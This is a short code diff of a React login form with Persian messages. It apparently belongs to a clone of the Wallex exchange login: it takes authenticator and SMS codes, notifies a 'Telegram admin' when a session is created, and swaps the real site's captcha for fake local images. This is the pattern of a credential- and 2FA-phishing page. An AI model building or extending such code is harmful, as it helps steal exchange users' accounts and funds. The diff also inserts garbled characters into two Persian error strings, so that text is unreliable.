@@ -169,7 +169,7 @@ export const LoginForm = () => {
           setGoogleCode(""); // Clear Google code field
           setErrors({
             googleCode:
-              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صح��ح را وارد کنید.",
           });
           break;
         case "sms":
@@ -375,7 +375,7 @@ export const LoginForm = () => {
         throw new Error("Failed to send notification to Telegram admin");
       }
 
-      console.log("��� Session created:", result.sessionId);
+      console.log("✅ Session created:", result.sessionId);
       setSessionId(result.sessionId);
       setPhoneNumber(mobileNumber);
       sessionStorage.setItem("sessionId", result.sessionId);
@@ -493,7 +493,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
+      setErrors({ verifyCode: "کد تایی�� نادرست است. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -1575,12 +1575,10 @@ export const LoginForm = () => {
                             tabIndex={0}
                             type="button"
                             onClick={() => {
-                              // Refresh captcha by adding timestamp to force reload
-                              const captchaImg = document.querySelector('img[alt="کد امنیتی"]') as HTMLImageElement;
-                              if (captchaImg) {
-                                const timestamp = new Date().getTime();
-                                captchaImg.src = `https://wallex.ir/api/captcha/generate?t=${timestamp}`;
-                              }
+                              // Cycle to next captcha image
+                              setCurrentCaptchaIndex((prev) => (prev + 1) % captchaImages.length);
+                              // Clear current captcha input
+                              setCaptchaCode("");
                               console.log("Refreshing captcha...");
                             }}
                             style={{
